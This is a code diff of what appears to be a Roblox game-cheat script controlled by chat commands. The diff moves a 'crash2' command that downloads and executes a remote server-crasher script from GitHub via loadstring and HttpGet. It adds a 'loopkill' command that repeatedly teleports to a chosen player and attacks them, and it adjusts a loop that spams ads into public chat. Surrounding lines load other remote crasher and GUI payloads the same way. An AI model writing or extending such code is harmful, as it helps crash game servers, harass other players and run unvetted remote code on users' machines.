@@ -35,6 +35,8 @@ game.StarterGui:SetCore("SendNotification", {
 
 local adverb = false
 
+local loopkill = false
+
 local dropping = false
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
@@ -234,9 +236,7 @@ local function onChatted(p,msg)
          if msg:match(prefix.."sellinggui") then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Crostide/cdhc/main/gui"))()
         end
-	if msg:match(prefix.."crash2") then	
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-	end
+
 	if msg:match(prefix.."godme") then
 	if game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Attacking") then
         game.Players.LocalPlayer.Character.BodyEffects:FindFirstChild("Attacking"):Destroy()
@@ -268,15 +268,13 @@ local function onChatted(p,msg)
             print("Started dropping "..stopcash)
             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Start","All")
         end
-        if msg == prefix.."dance" then
-            game:GetService("Players"):Chat("/e dance2")
-        end
         if msg == prefix.."advert" then
             adverb = not adverb
+	    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Adverb toggled","All")
             while adverb do
-    		print("Adverb enabled")
+    		
     		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(adverbmsg,"All")
-    		wait(9.5)
+    		wait(11.5)
 		end
         end
         if msg == prefix.."stop" then
@@ -296,6 +294,9 @@ local function onChatted(p,msg)
                 loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
             end
         end
+	if msg:match(prefix.."crash2") then	
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+	end
         if msg:match(prefix.."wallet") then
             print(string.split(msg," ")[2])
             if string.split(msg," ")[2] == "show" then
@@ -354,6 +355,22 @@ local function onChatted(p,msg)
 	    else
             BringPlr(targetHumanoid,nil)
 	    end
+	    end
+        end
+	if Args[1] == prefix.."loopkill" then
+            if player.name == bringer then
+	    loopkill = not loopkill
+	    game.Players.LocalPlayer.Character.Head.Anchored = false
+            local targetHumanoid = GetPlayerFromString(Args[2])
+	    local TargetChar = targetHumanoid.Character
+	    while loopkill do
+		Root.CFrame = CFrame.new(TargetChar.HumanoidRootPart.Position)*CFrame.new(0,0,1)
+				if not c:FindFirstChild("Combat") then
+					c.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Combat)     
+				end
+				c.Combat:Activate()	
+				wait()
+	   end
 	    end
         end
         if msg:match(prefix.."setup") then
